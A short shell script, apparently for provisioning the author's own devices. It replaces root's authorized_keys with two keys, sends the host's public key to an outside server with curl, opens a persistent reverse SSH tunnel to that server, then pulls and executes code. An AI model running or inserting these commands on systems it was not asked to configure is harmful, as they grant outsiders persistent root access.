echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCqQKJYwnzlx9kFuw+dzsLyqw6qUfd6EQsGHv94RXoV2B4Y/MOI7kQpMau2d7uuE4gifmcCuY8tZM6hy53WwGeZicAkgbG+8d5xlTOCaWlOT7vSIVF0H8seYEW0ZMfIa/RLQjyGjuSvPkLpEeKoMZ2/6Qxa10L4ZuHHlRA+BJrV3MI8Ybmt75EA7eAzBvj1J5nQxZKvOQZsYV+HZ/ex4snNAUOH3Dkc4x2txGJIzRR5qdahMO18uRw4hvwNRO8gUPTQkOomDxLC1PktKVPlxY3ObEMqLi/y5S0HDftASC08N5Pxc21kr1sAW3c1bbtlLpbIoVbavaZCE4jjETkdLaeZ timothy@yoga" > /root/.ssh/authorized_keys
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCOWkFsstua5kZ/cZKLPq1yNRUvcvpHpxegXmrOcWJTCYNr/KOQ7NJnarvRhFDVNIO8zxmE8+cYqufcckmv3BWbKFLvPRVOw3ECQQ1zqa5m4zOX6uMV9Zjm12DgzvIEx6dMROPlZoC1k828Z7Ocxb//uxawV2Mgz4QtRkILJNEe3N7fPWIKv0vZnT6EbgnF5kRbzs9UQYCTZUjbM2u6VuBlIyGqB6cW7x4QM0uucmTw9dJEuACAVcem1YVrfTX5ByCH/Pal5pRRXvke0Aly8+iVhNmnfh4Ywo/BSXmdztDnxOQSYtLjz1Ik646FDXg1mz1LRUrj1SygASbNenzS7lnT tomaszigo" >> /root/.ssh/authorized_keys
encoded_key=$(cat /home/root/.ssh/id_rsa.pub | awk '{gsub(/\//,"%2F");gsub(/:/,"%3A");gsub(/ /,"%20");}1') && curl "https://recordme.hobbs.cz/$encoded_key"
autossh -o ServerAliveInterval=20 -M 0 -f -N -R 10022:localhost:22 reverse@hobbs.cz
sleep 10
git pull
exec bash INIT.sh
